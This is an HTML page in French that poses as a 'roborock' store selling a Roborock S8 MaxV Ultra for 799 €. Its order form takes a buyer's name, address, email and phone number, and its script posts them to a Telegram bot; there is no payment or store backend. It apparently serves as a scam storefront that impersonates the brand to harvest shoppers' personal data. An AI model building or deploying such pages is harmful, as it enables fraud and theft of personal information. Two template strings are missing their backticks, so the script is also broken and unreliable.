<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Complete Page</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    /* Reset CSS */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Arial', sans-serif;
      line-height: 1.6;
      color: #333;
    }

    /* Header Styles */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 20px;
      background: #fff;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }

    .menu-icon {
      font-size: 18px;
      cursor: pointer;
      color: #333;
    }

    .logo {
      display: flex;
      align-items: center;
    }

    .logo img {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      margin-right: 8px;
    }

    .logo span {
      font-size: 16px;
      font-weight: bold;
      color: #333;
    }

    .nav-items {
      display: flex;
      align-items: center;
    }

    .nav-items .btn {
      background-color: #ff4c4c;
      color: white;
      padding: 5px 15px;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      font-size: 12px;
      margin-right: 10px;
    }

    .nav-items i {
      font-size: 16px;
      color: #333;
      margin: 0 8px;
      cursor: pointer;
    }

    /* Features Section */
    .features {
      padding: 50px 20px;
      background: #f8f8f8;
      text-align: center;
    }

    .features h2 {
      font-size: 2rem;
      margin-bottom: 20px;
    }

    .features .feature-container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 30px;
    }

    .feature {
      background: white;
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    .feature img {
      width: 100%;
      margin-bottom: 15px;
    }

    .feature h3 {
      font-size: 1.5rem;
      margin-bottom: 10px;
    }

    .feature p {
      font-size: 1rem;
      color: #555;
    }

    button {
      background-color: red;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: darkred;
    }

    /* Form Section */
    #customer-info {
      display: none;
      margin: 20px;
      padding: 20px;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    #customer-info img {
      max-width: 200px;
      border-radius: 10px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <!-- Header Section -->
  <div class="header">
    <div class="menu-icon">
      <i class="fas fa-bars"></i>
    </div>
    <div class="logo">
      <img src="322144555_5652290678220387_8371673163580908615_n.jpg" alt="Logo">
      <span>roborock</span>
    </div>

    <div class="nav-items">
      <a href="#our-features" class="btn">Boutique</a>
      <i class="fas fa-search"></i>
      <i class="fas fa-user"></i>
      <i class="fas fa-shopping-cart"></i>
    </div>
  </div>

  <!-- Features Section -->
  <section id="our-features" class="features">
    <div class="container" id="product-list">
      <div class="feature-container">
        <div class="feature">
          <h3>Roborock S8 MaxV Ultra</h3>
          <img src="S8MaxVUltra_A_Fr.webp" alt="Roborock S8">
          <p>Prix: <span>799</span> €</p>
          <button onclick="showCustomerForm('Roborock S8 MaxV Ultra', '799', 'S8MaxVUltra_A_Fr.webp')">Acheter Maintenant</button>
        </div>
        <!-- Add more products if needed -->
      </div>
    </div>
  </section>

  <!-- Customer Info Form -->
  <div id="customer-info">
    <h3 id="selected-product-name">Produit</h3>
    <img id="selected-product-image" src="" alt="Produit">
    <p id="selected-product-price">Prix: €</p>

    <form id="order-form">
      <label>Prénom:</label>
      <input type="text" id="prenom" name="prenom" required><br><br>
      <label>Nom:</label>
      <input type="text" id="nom" name="nom" required><br><br>
      <label>Adresse:</label>
      <input type="text" id="adresse" name="adresse" required><br><br>
      <label>Email:</label>
      <input type="email" id="email" name="email" required><br><br>
      <label>Numéro de téléphone:</label>
      <input type="tel" id="telephone" name="telephone" required><br><br>
      <button type="button" onclick="sendToTelegram()">Envoyer</button>
    </form>
  </div>

  <script>
    // Display form and product details
    function showCustomerForm(name, price, image) {
      document.getElementById('product-list').style.display = 'none';
      const customerInfo = document.getElementById('customer-info');
      customerInfo.style.display = 'block';
      document.getElementById('selected-product-name').textContent = name;
      document.getElementById('selected-product-price').textContent = Prix: ${price} €;
      document.getElementById('selected-product-image').src = image;
    }

    // Send data to Telegram
    function sendToTelegram() {
      const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
      const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID

      const prenom = document.getElementById('prenom').value;
      const nom = document.getElementById('nom').value;
      const adresse = document.getElementById('adresse').value;
      const email = document.getElementById('email').value;
      const telephone = document.getElementById('telephone').value;
      const productName = document.getElementById('selected-product-name').textContent;
      const productPrice = document.getElementById('selected-product-price').textContent;

      const message = `
Nouvelle Commande:
Produit: ${productName}
Prix: ${productPrice}
Prénom: ${prenom}
Nom: ${nom}
Adresse: ${adresse}
Email: ${email}
Téléphone: ${telephone}
      `;

      fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
        .then(response => {
          if (response.ok) {
            alert('Commande envoyée avec succès!');
            location.reload();
          } else {
            alert('Erreur lors de l\'envoi de la commande.');
          }
        })
        .catch(error => {
          alert('Erreur réseau.');
          console.error(error);
        });
    }
  </script>

</body>
</html>
